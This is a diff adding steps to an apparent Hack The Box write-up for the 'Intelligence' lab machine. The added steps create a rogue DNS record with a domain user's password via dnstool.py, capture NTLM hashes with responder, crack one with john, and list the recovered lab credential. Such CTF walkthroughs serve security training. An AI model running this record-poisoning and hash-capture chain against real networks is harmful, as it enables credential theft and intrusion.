@@ -107,3 +107,21 @@ smbclient \\\\10.10.10.248\\IT -U intelligence.htb/Tiffany.Molina
 ![image](https://github.com/regarmulia/HTB/assets/33616880/d81005aa-6f13-4698-941d-57d3de9a0095)
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/c6526640-fcd1-4dd6-9486-20c982b8e738)
+
+```
+https://github.com/dirkjanm/krbrelayx
+./dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.20 -t A
+responder -I tun0
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/5fc68265-dab2-4817-972b-3c52bc647e63)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/0915f164-fa0e-4265-b707-cd6e4c2ba008)
+
+```
+john hash -w=/usr/share/wordlists/rockyou.txt
+Ted.Graves | Mr.Teddy
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/9652e79f-8d7d-4049-b812-64cf935c500c)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/95066406-d2c7-472f-a0dd-0dd7827689cb)
+
